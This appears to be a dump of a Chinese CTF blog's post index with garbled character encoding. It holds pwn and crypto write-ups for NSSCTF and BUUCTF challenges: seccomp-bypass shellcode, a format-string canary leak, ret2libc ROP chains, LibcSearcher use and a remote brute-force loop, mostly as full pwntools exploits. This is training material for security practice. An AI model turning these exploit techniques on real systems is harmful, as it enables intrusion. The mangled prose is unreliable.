â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ•‘ â•šâ•â• â•šâ•â•â•šâ•â• â•šâ•â• â•šâ•â•â•â•â•â• â•šâ•â• â•šâ•â•â•â•â•â• â•šâ•â•â•â•â•â• â•šâ•â•â•â•â•â• â•šâ•â•â•â•â•â•â•šâ•â• â•šâ•â•â•šâ•â•â•â•â•â•â•â•šâ•â• â•šâ•â• \"\"\" if __name__ == \"__main__\": os.system(\"rm -f /flag\") print(BANNER) random.seed(\"NSSCTF 2nd\") answer=random.randint(0,100) if len(sys.argv)&lt;2: print(\"You need to give me the secret!\") else: func() è‹¥æŒ‰ç…§é¢„è®¾å‘½ä»¤æ‰§è¡Œå®Œmain.pyåï¼Œå®¹å™¨ä¼šåˆ é™¤flagæ–‡ä»¶ æ‰€ä»¥æˆ‘ä»¬è‡ªå®šä¹‰dockerå¯åŠ¨å‘½ä»¤ ç›´æ¥æ‰§è¡Œcat /flag gift_in_qrcode(revenge)é“¾æ¥ä¸€ä¸‹å¾—åˆ°ä¸€å †Base64ç¼–ç  å…ˆå†™ä¸ªè„šæœ¬è§£ç Base64ä¿å­˜ä¸ºpng import base64 # Paste the Base64 encoded string here base64_string = \"your_base64_string_here\" # Decode the Base64 string decoded_data = base64.b64decode(base64_string) # Save the decoded data as a PNG file with open(\"image.png\", \"wb\") as f: f.write(decoded_data) æ‰«ç å¾—åˆ°äºŒåä¸ªéšæœºæ•° æ ¹æ®è®¡ç®—éšæœºæ•°ç§å­ï¼Œå¹¶è®¡ç®—ä¸‹ä¸€ä¸ªéšæœºæ•°ï¼Œè¾“å…¥ç¨‹åºä¸­å³å¯æ‹¿åˆ°flag from random import randrange, getrandbits, seed def poc(): for i in range(1,1000): secret_seed = i seed(secret_seed) a = [97,45,232,198,115,215,226,198,32,189,8,210,84,11,150,134,221,207,167,176] reveal = [] for i in range(20): reveal.append(getrandbits(8)) if reveal == a: flag = getrandbits(8) return flag return False print(poc()) ç„¶åæœ€æ— è„‘çš„çˆ†ç ´æ¥äº† ä¸ºä»€ä¹ˆè¦çˆ†è¿™ä¹ˆä¹…ï¼Œæ—©çŸ¥é“æˆ‘å†å¤šçˆ†ä¸€ä¼šçš„.. from pwn import * count = 0 while True: conn = remote(\"node5.anna.nssctf.cn\", 28380) conn.recvline().decode() conn.recvline().decode() conn.recv().decode() conn.sendline(str('110').encode()) count += 1 print('count:', count) output = conn.recvline().decode() if 'No no no!' not in output: print(output) break CryptoEzRSAå‘ç°e - 3 ï¼Œä½åŠ å¯†æŒ‡æ•°çˆ†ç ´ è„šæœ¬ä¸€æŠŠæ¢­ import binascii import gmpy2 e = 3 # è¯»å…¥ n, å¯†æ–‡ n = 115383855234466224643769657979808398804254899116842846340552518876890834212233960206021018541117724144757264778086129841154749234706140951832603640953383528482125663673926452745186670807057426128028379664506531814550204605131476026038420737951652389070818761739123318769460392218629003518050621137961009397857 c = 5329266956476837379347536739209778690886367516092584944314921220156032648621405214333809779485753073093853063734538746101929825083615077 i = 0 while 1: res = gmpy2.iroot(c+i*n,3) if(res[1] == True): m=res[0] print(binascii.unhexlify(hex(m)[2:].strip(\"L\"))) break print(\"i=\"+str(i)) i = i+1 NSSCTF{Rea1_Si9n3n} FunnyEncrypt æœ¬æ¥æƒ³çœ‹çœ‹èƒ½ä¸èƒ½è¯é¢‘åˆ†æçš„ï¼Œç»“æœå‘ç°å®Œå…¨å¯¹ä¸åˆ° åªå¥½æ ¹æ®å·²çŸ¥çš„nssctfå’Œå‰é¢çš„ä¸€å †è¯é‡Œé¢å¯»æ‰¾ç¬¦åˆé¢„æ„Ÿçš„å­—ç¬¦ä¸å­—æ¯å¯¹åº”å…³ç³» ï¼Œ æ…¢æ…¢å¯¹åº”ç€å¯ä»¥æ‰¾åˆ°çš„ PWNhappy ä¸»å‡½æ•°é¦–å…ˆç»•è¿‡proofï¼Œæ¥ç€forkä¸€ä¸ªå­è¿›ç¨‹ï¼Œåœ¨çˆ¶è¿›ç¨‹ä¸­è¿›è¡Œä¸€ä¸ªæœ‰æ²™ç®±é™åˆ¶çš„shellcodeæ‰§è¡Œ è¿™ä¸ªåœ°æ–¹åœ¨è°ƒè¯•çš„æ—¶å€™å¯èƒ½å®¹æ˜“å¡ä½ï¼Œéœ€è¦ç”¨set follow-fork-mode parentåœç•™åœ¨çˆ¶è¿›ç¨‹ç»§ç»­è°ƒè¯• é¦–å…ˆæˆ‘ä»¬æ¥çœ‹proofå‡½æ•° è¦æƒ³è®©v4=v3ï¼Œé‚£ä¹ˆåªèƒ½é€šè¿‡printfçœ‹çœ‹å¯ä¸å¯ä»¥æŠŠä¸€äº›ä¿¡æ¯æ³„éœ²å‡ºæ¥ï¼Œç„¶åå†é€šè¿‡è®¡ç®—å¾—åˆ°putsçš„åœ°å€ é€šè¿‡è°ƒè¯•èƒ½å¤Ÿå‘ç°ï¼Œprintfå¯ä»¥æŠŠæ ˆä¸Šçš„æ•°æ®æ‰“å°å‡ºæ¥ï¼Œè¿™é‡Œé€‰æ‹©æ³„éœ²å‡º_IO_2_1_stderr_çš„libcåœ°å€ è®¡ç®—å¾—åˆ°putsçš„çœŸå®åœ°å€ï¼Œç»•è¿‡proofæ£€æµ‹ è¿™é‡Œä¸€å®šæ³¨æ„scanfå‡½æ•°çš„ä¸€äº›ç‰¹æ€§ï¼Œç‰¹åˆ«æ˜¯æ¶‰åŠåˆ°\\nï¼Œ+-å·å‡½æ•°æ˜¯ä¼šéƒ¨åˆ†å¿½ç•¥è¿˜æ˜¯å®Œå…¨å¿½ç•¥è¿˜æ˜¯æ­£å¸¸è°ƒç”¨ååˆ†å…³é”®ï¼Œè¿™å¯ä»¥å¸®åŠ©èŠ‚çº¦å¤§é‡è°ƒè¯•çš„æ—¶é—´ å‚è€ƒï¼šhttps://blog.csdn.net/qq_54218833/article/details/121308367 æ¥ä¸‹æ¥å°±æ˜¯shellcodeçš„ç¼–å†™äº† __int64 sandbox() { __int64 v1; // [rsp+8h] [rbp-8h] v1 = seccomp_init(2147418112LL); seccomp_rule_add(v1, 0LL, 0LL, 0LL); seccomp_rule_add(v1, 0LL, 42LL, 0LL); seccomp_rule_add(v1, 0LL, 57LL, 0LL); seccomp_rule_add(v1, 0LL, 322LL, 0LL); return seccomp_load(v1); } å¯ä»¥çœ‹å‡ºæ¥ç¦ç”¨äº†readï¼Œconnectï¼Œexecve è°ƒç”¨ è¿™é‡Œç”¨openï¼Œpread64ï¼Œwriteç»•è¿‡ å†™exp from Excalibur import* contextset() proc('./pwn') #debug('b *0x4013FA\\nb *0x401514\\n') #debug('b *0x40142E\\nb *0x401490\\n') #debug('b *0x401508\\n') debug('b *0x401563\\n') el('./pwn') lib('./libc.so.6') puts_got = got('puts')#0x403FF0 stderr = libcsym('_IO_2_1_stderr_') puts = libcsym('puts') sla(b'konw',b'16') for i in range(0,16): sl(b'+') #sl(b'a') ru(b'0') std = int(rec(15)) prh(std) libcbase = std - stderr puts = libcbase+puts prh(puts) pr(str(puts)) sda(b'try',str(puts)) bss = 0x4040A0 shellcode =''' nop nop push 0x67616c66 mov rdi, rsp xor rdx, rdx xor rsi, rsi push 0x2 pop rax syscall ''' #shellcraft.open(\"flag\") shellcode += ''' push 0x11 pop rax push 0x4041A0 pop rsi push 0x3 pop rdi push 0x64 pop rdx push 0x0 pop r10 syscall ''' shellcode += shellcraft.write(1,bss + 0x100, 100) shellcode = asm(shellcode) print(shellcode) print(len(shellcode)) sl(shellcode) ia()","categories":[{"name":"wp","slug":"wp","permalink":"http://lmarch2.github.io/categories/wp/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://lmarch2.github.io/tags/ctf/"},{"name":"NSSCTF","slug":"NSSCTF","permalink":"http://lmarch2.github.io/tags/NSSCTF/"}]},{"title":"WSL2ä¸‹ä¸èƒ½ä½¿ç”¨gdb.attachçš„è§£å†³æ–¹æ¡ˆ","slug":"WSL2ä¸‹ä¸èƒ½ä½¿ç”¨gdb-attachçš„è§£å†³æ–¹æ¡ˆ","date":"2023-08-29T12:53:24.000Z","updated":"2024-02-04T06:46:48.950Z","comments":true,"path":"posts/19b7c9d1/","link":"","permalink":"http://lmarch2.github.io/posts/19b7c9d1/","excerpt":"","text":"pwndbgåœ¨WSLä¸‹ä¸€ç›´æ²¡æ³•ä½¿ç”¨ä¸‹æ–­ç‚¹è°ƒè¯•çš„åŠŸèƒ½ï¼Œæ‰¾äº†åŠå¤©å‘ç°tmuxå¯ä»¥å¸®åŠ©è§£å†³è¿™ä¸ªé—®é¢˜ å®‰è£…tmuxç”¨rootæƒé™å®‰è£… sudo apt-get install tmux è¿›å…¥æ ¹ç›®å½• cd ~ ç¼–è¾‘é…ç½®ä½¿ç”¨rootæƒé™æ‰“å¼€tmuxï¼Œæ–¹ä¾¿ä¿å­˜é…ç½®æ–‡ä»¶ sudo tmux æ–°å»º.tmux.confæ–‡ä»¶ vim .tmux.conf åœ¨æ–‡ä»¶ä¸­è¾“å…¥ #è¾“å…¥ bind-key c new-window -c \"#{pane_current_path}\" bind-key % split-window -h -c \"#{pane_current_path}\" bind-key '\"' split-window -c \"#{pane_current_path}\" set -g mouse on å…³é—­æ‰€æœ‰tmuxçª—å£å¹¶è¾“å…¥ tmux source-file ~/.tmux.conf é‡æ–°å¯åŠ¨tmuxåˆ™å®Œæˆæ›´æ”¹ã€ ä½¿ç”¨æ¥ä¸‹æ¥å¯ä»¥åœ¨expä¸­ä¸‹æ–­ç‚¹äº† gdb.attach(p) åŒæ—¶è¦åœ¨expä¸­åŠ ä¸ŠæŒ‡å®šterminal context.terminal = [â€˜tmuxâ€™, â€˜splitwâ€™, â€˜-hâ€™] -hä»£è¡¨æ¨ªå‘åˆ†å± ä¹‹åå°±å¯ä»¥åœ¨è¿è¡Œexpæ—¶debug æ³¨æ„è¦åœ¨tmuxç»ˆç«¯ä¸‹è¿è¡Œ","categories":[{"name":"tools and tricks","slug":"tools-and-tricks","permalink":"http://lmarch2.github.io/categories/tools-and-tricks/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://lmarch2.github.io/tags/pwn/"}]},{"title":"NSSCTF ROUND#14 wp","slug":"ROUND14 love","date":"2023-08-29T12:46:39.000Z","updated":"2024-02-04T06:52:26.261Z","comments":true,"path":"posts/fa745d1d/","link":"","permalink":"http://lmarch2.github.io/posts/fa745d1d/","excerpt":"","text":"NSSCTF ROUND#14love0x01ç¨‹åºå¼€å¯NXå’Œcanaryä¿æŠ¤ vulnå‡½æ•°ä¸­å­˜åœ¨æ ˆæº¢å‡º å˜é‡v4 = 555ï¼Œv5 = 520 readå‡½æ•°è¯»å…¥0x40å­—èŠ‚ï¼Œåœ¨printfå¤„æœ‰æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ éœ€è¦æ³¨æ„bufä¸ºbssæ®µå˜é‡ï¼Œéæ ˆæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ä¸èƒ½ç›´æ¥ä¿®æ”¹æ ˆä¸Šçš„å€¼ï¼Œéœ€è¦é€šè¿‡äºŒçº§æŒ‡é’ˆï¼Œå³æ ˆé“¾é—´æ¥ä¿®æ”¹ æ€è·¯ï¼š åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ä»»æ„å†™ä¿®æ”¹è®©v4=v5ï¼Œè¿›å…¥vulnå‡½æ•° åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ³„éœ²canaryå’Œ__libc_start_mainå‡½æ•°çœŸå®åœ°å€ï¼Œè®¡ç®—å‡ºlibcåŸºå€ æ„é€ payè¦†ç›–è¿”å›åœ°å€ä¸ºogæˆ–system ropé“¾getshell 0x02ç¬¬ä¸€æ­¥å°†v4å†™ä¸º520ã€‚å¦‚å›¾åœ¨æ ˆåç§»ä¸º3çš„åœ°æ–¹æœ‰ä¸€ä¸ªæ ˆé“¾ï¼š0x7ffe9c35d798-&gt;0x7ffe9c35d788&lt;-0x22bï¼Œå¯ä»¥ç”¨æ¥ä¿®æ”¹0x22bä¸º0x208 è¿™é‡Œå¯æ„é€ payä¸º pay = â€˜%â€™+str(8)+â€™câ€™+â€™%9$hhnâ€™ æˆ–è€… pay = â€˜%â€™+str(520)+â€™câ€™+â€™%9$hhnâ€™ ï¼ˆä¹Ÿå¯ä»¥ç›´æ¥nä¸ç”¨hhnï¼‰ ç¬¬äºŒæ­¥æ³„éœ²canary å’Œ __libc_start_mainåœ°å€ è¿™é‡Œéœ€è¦å…ˆpatchelfå†è°ƒè¯•ç¡®å®šåç§» è¿™é¢˜ä¸ä»…è¦patchæ‰libcå’Œldï¼Œè¿˜è¦å†patchelf â€“replace-needed libpthread.so.0 ./libpthread-2.31.so ./binary ç¡®å®šcanaryçš„åç§»ä¸º9+6 = 15ï¼›__libc_start_main+243ä¾¿å®œä¸º11+6 = 17 pay += â€˜-%15$p-%17$p-â€˜ 0x03è¦†ç›–è¿”å›åœ°å€ä¸ºone_gadgetï¼Œæˆ–è€…è°ƒç”¨systemå‡½æ•° from pwn import * context(os='linux', arch='amd64', log_level='debug') context.terminal = ['tmux', 'splitw', '-h'] p = process(\"./pwn\") #p = remote('node4.anna.nssctf.cn',28157) sda = lambda delim,data :p.sendafter(delim,data) sd = lambda data :p.send(data) sea = lambda delim,data :p.sendafter(delim,data) sl = lambda data :p.sendline(data) sla = lambda delim,data :p.sendlineafter(delim,data) ru = lambda delims,drop=True :p.recvuntil(delims,drop) uu32 = lambda data :u32(data.ljust(4,b'\\x00')) uu64 = lambda data :u64(data.ljust(8,b'\\x00')) lg = lambda name,addr :log.success(name+'='+hex(addr)) ra = lambda :p.interactive() def get_addr64() : return u64(p.recvuntil(b'\\x7f')[-6:].ljust(8, b'\\x00')) def get_addr32() : return u32(p.recvuntil(b'\\xf7')[-4:]) #gdb.attach(p) elf = ELF('./pwn') libc = ELF('./libc.so.6') puts_plt=elf.plt['puts'] puts_got=elf.got['puts'] pay = '%'+str(520)+'c'+'%9$hhn' pay += '-%15$p-%17$p-' gdb.attach(p) sla(b'Toka\\n',pay) ru('-') #æ³„éœ²cannary canary = int(ru('-'),16) #libc libc_base = int(ru('-'),16)-243-libc.sym['__libc_start_main'] pop_rdi = 0x00000000004013f3 #pay=b'A'*0x28+p64(canary)+b'A'*8+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(elf.sym['vuln']) #sla('level\\n',pay) #libcbase = get_addr64()-libc.sym['puts'] #lg('libcbase',libcbase) lg('canary',canary) lg('libc_base',libc_base) system_addr = libc_base+libc.sym[\"system\"] bin_sh_addr=libc_base+libc.search(b'/bin/sh').__next__() lg('system',system_addr) lg('binsh',bin_sh_addr) ru('level\\n') ret =0x000000000040101a og = [0xe3afe,0xe3b01,0xe3b04] pay = b'a'*0x28+p64(canary)+b'a'*8+p64(ret)+p64(og[1]+libc_base) #pay = b'a'*0x28+p64(canary)+b'a'*8+p64(ret)+p64(pop_rdi)+p64(bin_sh_addr)+p64(system_addr) sl(pay) ra()","categories":[{"name":"wp","slug":"wp","permalink":"http://lmarch2.github.io/categories/wp/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://lmarch2.github.io/tags/ctf/"},{"name":"NSSCTF","slug":"NSSCTF","permalink":"http://lmarch2.github.io/tags/NSSCTF/"}]},{"title":"ret2libc3åˆé›†","slug":"ret2libc3åˆé›†","date":"2023-08-29T12:45:22.000Z","updated":"2024-02-04T06:46:34.792Z","comments":true,"path":"posts/be5100f9/","link":"","permalink":"http://lmarch2.github.io/posts/be5100f9/","excerpt":"","text":"ret2libc3ç›®å‰ä¸€äº›æ¯”è¾ƒç»å…¸çš„ret2libc2çš„æ€»åˆé›†ï¼ŒåŒ…æ‹¬32ä½å’Œ64ä½ï¼Œæœ‰libcæ–‡ä»¶å’Œæ²¡æœ‰libcæ–‡ä»¶ ctf-wiki ret2libc3è€ƒç‚¹ï¼šæ ˆæº¢å‡ºrop 0x01file checksec â€”â€” 32-bit å¼€NX æ¼æ´å’Œå†…å­˜åˆ†æå’Œä¹‹å‰çš„ç³»åˆ—é¢˜ç±»ä¼¼ï¼Œä¸èµ˜è¿°äº† 0x02IDAçœ‹æºç ï¼Œæ—¢æ²¡æœ‰systemä¹Ÿæ²¡æœ‰binsh ç”±linuxå»¶è¿Ÿç»‘å®šæœºåˆ¶çš„çŸ¥è¯†ï¼ˆåé¢å†å†™ä¸€ç¯‡æ€»ç»“å§ï¼‰å¯çŸ¥ï¼Œæˆ‘ä»¬å¦‚æœè¦è°ƒç”¨systemå‡½æ•°ï¼Œå°±è¦çŸ¥é“ä»–çš„gotè¡¨ä¸­çš„åœ°å€ï¼Œä½†libcè¢«åŠ è½½åˆ°çš„å†…å­˜çš„ä½ç½®æ˜¯éšæœºçš„ï¼Œæˆ‘ä»¬æ— æ³•å¾—çŸ¥ä¸è¿‡ï¼ŒåŒä¸€ç‰ˆæœ¬çš„libcçš„ä¸¤ä¸ªåº“å‡½æ•°åœ¨libcä¸­çš„ç›¸å¯¹ä½ç½®æ˜¯ä¸å˜çš„ï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬å¯ä»¥çŸ¥é“ä¸€ä¸ªå·²ç»æ‰§è¡Œè¿‡çš„å‡½æ•°çš„gotè¡¨åœ°å€ï¼Œç„¶åç¡®å®šlibcçš„ç‰ˆæœ¬ï¼Œå°±å¯ä»¥åŠ ä¸Šå’Œsystemå‡½æ•°çš„åç§»ï¼Œä»è€Œå¾—åˆ°systemå‡½æ•°çš„çœŸå®åœ°å€ï¼ˆgotè¡¨åœ°å€ï¼‰è€Œç°åœ¨æˆ‘ä»¬æœ‰ä¸€ä¸ªputså‡½æ•°ï¼Œlibcä¸­ä¹Ÿæœ‰systemå’Œbinsh 0x03æˆ‘ä»¬åªéœ€è¦é€šè¿‡æ ˆæº¢å‡ºåˆ©ç”¨putså‡½æ•°ï¼Œæ‰“å°putså‡½æ•°çš„gotè¡¨ä¸­çš„åœ°å€ï¼Œç„¶åè·å–åç§»ï¼Œå¾—åˆ°systemå‡½æ•°å’Œ/bin/shå­—ç¬¦ä¸²çš„åœ°å€ï¼Œå†å°†putså‡½æ•°çš„è¿”å›åœ°å€è¦†ç›–ä¸ºsystemå‡½æ•°çš„åœ°å€å³å¯æˆ‘ä»¬å¯ä»¥å…ˆè¿è¡Œexp1ï¼ˆè§0x04ï¼‰æ‹¿åˆ°è·å–putsçš„çœŸå®åœ°å€ï¼Œç„¶åå»libc- database -searchçš„ç½‘ç«™æŸ¥è¯¢ï¼Œå¯å¾—åˆ°putså‡½æ•°systemå‡½æ•°å’Œbinshå­—ç¬¦ä¸²å¯¹åº”çš„åç§»åœ°å€ çŸ¥é“äº†putså‡½æ•°çš„çœŸå®åœ°å€å’Œåç§»ä¹‹åï¼Œå°±å¯ä»¥å°†putså‡½æ•°çš„çœŸå®åœ°å€å‡å»åç§»åœ°å€ï¼Œå¾—åˆ°libcçš„åŸºå€ï¼Œå°†libcçš„åŸºå€åˆ†åˆ«ä¸systemï¼Œ/bin/shå­—ç¬¦ä¸²çš„åç§»ç›¸åŠ ï¼Œå°±å¯ä»¥å¾—åˆ°å¯¹åº”çš„çœŸå®åœ°å€ç„¶åå†™å®Œæ•´çš„exp 0x04æ‰€ä»¥å…¶å®expæ˜¯åˆ†ä¸¤éƒ¨çš„ï¼Œç¬¬ä¸€æ­¥æ˜¯æ„é€ æ ˆæº¢å‡ºåˆ©ç”¨putså‡½æ•°æ‰“å°å‡ºçœŸå®åœ°å€ï¼›ç¬¬äºŒæ­¥æ˜¯æº¢å‡ºè¦†ç›–è‡³systemå‡½æ•°å’Œ/bin/shçš„åœ°å€ï¼Œæ‹¿åˆ°shell #first exp from pwn import * elf=ELF('ret2libc3') p=process('./ret2libc3') puts_plt=elf.plt['puts'] puts_got=elf.got['puts'] start_addr = elf.symbols['_start'] payload1=b'A'*112+p32(puts_plt)+p32(start_addr)+p32(puts_got) p.sendlineafter(\"!?\",payload1) puts_addr=u32(p.recv(4)) print(\"puts_got_addr = \",hex(puts_got_addr)) print(\"puts_plt_addr = \",hex(puts_plt_addr)) print(\"main_plt_addr = \",hex(main_plt_addr)) print(\"puts addr = \", hex(puts_addr)) p.interactive() #second exp from pwn import * p = process('./ret2libc3') elf = ELF('./ret2libc3') puts_got_addr = elf.got['puts'] puts_plt_addr = elf.plt['puts'] main_plt_addr = elf.symbols['_start'] print(\"puts_got_addr = \",hex(puts_got_addr)) print(\"puts_plt_addr = \",hex(puts_plt_addr)) print(\"main_plt_addr = \",hex(main_plt_addr)) p.recv() p.sendline(payload) puts_addr = u32(p.recv()[0:4]) print(\"puts_addr = \",hex(puts_addr)) sys_offset = 0x03cd10 puts_offset = 0x067360 sh_offset = 0x17b8cf #æ ¹æ®å…¬å¼ libcåŸºåœ°å€ + å‡½æ•°åç§»é‡ = å‡½æ•°çœŸå®åœ°å€ æ¥è®¡ç®— libc_base_addr = puts_addr - puts_offset #è®¡ç®—å‡ºlibcåŸºåœ°å€ sys_addr = libc_base_addr + sys_offset #è®¡ç®—å‡ºsystemçš„çœŸå®åœ°å€ sh_addr = libc_base_addr + sh_offset #è®¡ç®—å‡º/bin/shçš„çœŸå®åœ°å€ print(\"libc_base_addr = \",hex(libc_base_addr)) print(\"sys_addr = \",hex(sys_addr)) print(\"sh_addr = \",hex(sh_addr)) payload2 = flat([b'A'*112, p32(sys_addr), \"AAAA\", p32(sh_addr)]) p.sendline(payload2) p.interactive() æˆ–è€…å†™ puts_addr = u64(p.recv(6).ljust(8,b'\\x00')) ä¸€å®šæ³¨æ„å‘é€payå‰æ¥æ”¶çš„å†…å®¹0x05æœç´¢libcå¸¸ç”¨æ–¹æ³•ï¼š LibcSearcher ç½‘ç«™æŸ¥æ‰¾ libc-databasellibc database search libc-database å‚è€ƒèµ„æ–™ï¼špwnå°ç™½å…¥é—¨06â€“ret2libcåŸºæœ¬ROPä¹‹ret2libc3yichenäºŒè¿›åˆ¶å®‰å…¨ å¯¹äºè¿”å›åœ°å€ä¸åŒè€Œå¯¼è‡´çš„è¾“å…¥åç§»ä¸åŒ ciscn_2019_c_10x01ç®€å•çš„ret2libc3file checksec â€”â€” 64-bit å¼€NX 0x02è¿è¡Œä¸€ä¸‹çœ‹çœ‹ å†çœ‹çœ‹IDA ç ”ç©¶äº†åŠå¤©å‘ç°æ˜¯è®©ä½ åŠ è§£å¯†çš„å†çœ‹çœ‹string window æ²¡ç”¨systemå’Œbinshåˆå‘ç°åŠ å¯†å‡½æ•°é‡Œæœ‰getså‡½æ•°ï¼Œå¯æ„æˆæ ˆæº¢å‡º 0x03åˆ†æå¤§è‡´æµç¨‹å°±æ˜¯ åˆ©ç”¨ä¸€ä¸ªç¨‹åºå·²ç»æ‰§è¡Œè¿‡çš„å‡½æ•°å»æ³„éœ²å®ƒåœ¨ç¨‹åºä¸­çš„åœ°å€ï¼Œç„¶åå–æœ«å°¾3ä¸ªå­—èŠ‚ï¼Œå»æ‰¾åˆ°è¿™ä¸ªç¨‹åºæ‰€ä½¿ç”¨çš„libcçš„ç‰ˆæœ¬ ç”¨åŒä¸€ä¸ªç¨‹åºé‡Œå‡½æ•°çš„åœ°å€-libcé‡Œçš„å‡½æ•°åœ°å€å³å¯å¾—åˆ°åç§»é‡ å¾—åˆ°åç§»é‡åå°±å¯ä»¥æ¨ç®—å‡ºç¨‹åºä¸­å…¶ä»–å‡½æ•°çš„åœ°å€ï¼ŒçŸ¥é“å…¶ä»–å‡½æ•°çš„åœ°å€ä¹‹åå°±å¯ä»¥å»æ‰§è¡Œsystemï¼ˆâ€™/bin/shâ€˜ï¼‰ 0x04å†™exp from pwn import* from LibcSearcher import* p=remote('node4.buuoj.cn',28342) elf=ELF('./ciscn_2019_c_1') main=0x400b28 pop_rdi=0x400c83 ret=0x4006b9 puts_plt=elf.plt['puts'] puts_got=elf.got['puts'] p.sendlineafter('choice!\\n','1') payload='\\0'+'a'*(0x50-1+8) payload+=p64(pop_rdi) payload+=p64(puts_got) payload+=p64(puts_plt) payload+=p64(main) p.sendlineafter('encrypted\\n',payload) p.recvline() p.recvline() puts_addr=u64(r.recvuntil('\\n')[:-1].ljust(8,'\\0')) print hex(puts_addr) libc=LibcSearcher('puts',puts_addr) offset=puts_addr-libc.dump('puts') binsh=offset+libc.dump('str_bin_sh') system=offset+libc.dump('system') p.sendlineafter('choice!\\n','1') payload='\\0'+'a'*(0x50-1+8) payload+=p64(ret) payload+=p64(pop_rdi) payload+=p64(binsh) payload+=p64(system) p.sendlineafter('encrypted\\n',payload) p.interactive() 0x05libcsearchçš„githubç½‘å€å®‰è£… git clone https://github.com/lieanu/LibcSearcher.gitcd LibcSearchersudo python setup.py develop è¦†ç›–æ•°æ®payload=bâ€™\\0â€™+bâ€™aâ€™*(0x50-1+8)\\0æ˜¯ä¸ºäº†è®©åŠ å¯†å‡½æ•°çš„ä¸€ä¸ªstrlenå‡½æ•°åœæ­¢ï¼ˆè¿™ä¸ªå‡½æ•°é‡â€˜0â€™ä¼šåœæ­¢ï¼‰ï¼Œä»è€Œç»•è¿‡åŠ å¯†ï¼Œä¿è¯æˆ‘ä»¬æ„é€ çš„ropä¸ä¼šè¢«ç ´åï¼Œbufçš„å¤§å°ä¸º0x50-1æ˜¯å‡å»\\0+8æ˜¯è¦†ç›–rbp è¿™é“é¢˜çš„æ¥æ”¶éå¸¸è®²ç©¶æ³„éœ²åœ°å€æ¥æ”¶æ—¶å…ˆæ˜¯ä¸¤ä¸‹recvline()ï¼ŒåŸå›  recvline()ä¸€æ¬¡æ¥æ”¶åˆ°\\n;ç¬¬ä¸€æ¬¡recvlineåªèƒ½åˆ°Ciphertextï¼›ç¬¬äºŒæ¬¡åªèƒ½æ¥æ”¶åˆ°0aç¬¬ä¸‰æ¬¡çš„recvuntilæ‰å¼€å§‹å¤„ç†æ³„éœ²çš„gotåœ°å€ã€‚å…ˆå¼€ä¸€ä¸‹context_log_lever=â€™debugâ€™ï¼Œæ•´ä½“çœ‹ä¸€ä¸‹ï¼Œ å†è‡ªå·±recvuntilçœ‹èƒ½æ¥æ”¶åˆ°ä»€ä¹ˆå†…å®¹ã€‚ ç„¶åå†ç”¨recvuntil(â€˜\\nâ€™)[:-1].ljust(8,â€™\\0â€™)æ¥èˆå¼ƒæ¥æ”¶åˆ°çš„å­—ç¬¦ä¸²æœ€åçš„â€™\\x0â€™å¹¶å‘å·¦è¡¥é½ è¿™ä¸€é“é¢˜æ˜¯64ä½çš„ç¨‹åºï¼Œè¿™è¾¹æ¶‰åŠåˆ°64ä½ç¨‹åºå’Œ32ä½ç¨‹åºè¿è¡Œæ—¶çš„åŒºåˆ«äº†32ä½ç¨‹åºè¿è¡Œæ‰§è¡ŒæŒ‡ä»¤çš„æ—¶å€™ç›´æ¥å»å†…å­˜åœ°å€å¯»å€æ‰§è¡Œ64ä½ç¨‹åºåˆ™æ˜¯é€šè¿‡å¯„å­˜å™¨æ¥ä¼ å€ï¼Œå¯„å­˜å™¨å»å†…å­˜å¯»å€ï¼Œæ‰¾åˆ°åœ°å€è¿”å›ç»™ç¨‹åºã€‚å› æ­¤è¦ç”¨å¯„å­˜å™¨å­˜å‚ æ³¨æ„æ ˆå¯¹é½ è¿˜æœ‰æœ€åè¿˜è¦å†è¾“ä¸€ä¸ª0 å‚è€ƒèµ„æ–™ï¼š [BUUCTF]PWN6â€”â€”ciscn_2019_c_1 [OGeek2019]babyropBUUCTF pwnè€ƒç‚¹ï¼š ret2libc3 0x0164ä½ç¨‹åºï¼Œå¼€å¯NX æ²¡æœ‰systemå‡½æ•°å’Œ/bin/shå­—ç¬¦ä¸² 0x02åˆ†æç¨‹åºï¼š mainå‡½æ•°ä¸­ï¼Œå…ˆè¯»å–ä¸€ä¸ªéšæœºæ•°åˆ°fdï¼Œå¹¶ä½œä¸ºå‚æ•°ä¼ å…¥sub_804871Få‡½æ•°ï¼Œå†å°†sub_804871Få‡½æ•°çš„è¿”å›å€¼ä½œä¸ºå‚æ•°ä¼ å…¥sub_80487D0å‡½æ•°é‡Œã€‚ mainå‡½æ•° sub_804871Få‡½æ•° sub_80487D0å‡½æ•° è§‚å¯Ÿç¨‹åºæˆ‘ä»¬å¯ä»¥å‘ç°sub_80487D0å‡½æ•°æœ‰æ ˆæº¢å‡ºæ¼æ´ ç„¶è€Œæƒ³è¦åˆ©ç”¨æ ˆæº¢å‡ºéœ€è¦æˆ‘ä»¬è¾¾æˆä¸¤ä¸ªç›®æ ‡ 1ã€ç»•è¿‡sub_804871Få‡½æ•°ä¸­çš„exitå‡½æ•°ï¼Œè¿™å°±è¦è®©strncmpçš„è¿”å›å€¼ä¸º0 2ã€è®©sub_80487D0å‡½æ•°ä¸­a1ï¼ˆå³buf[7]ï¼‰çš„ASCIIç å€¼å°½å¯èƒ½å¤§ï¼Œæ„é€ æ ˆæº¢å‡º 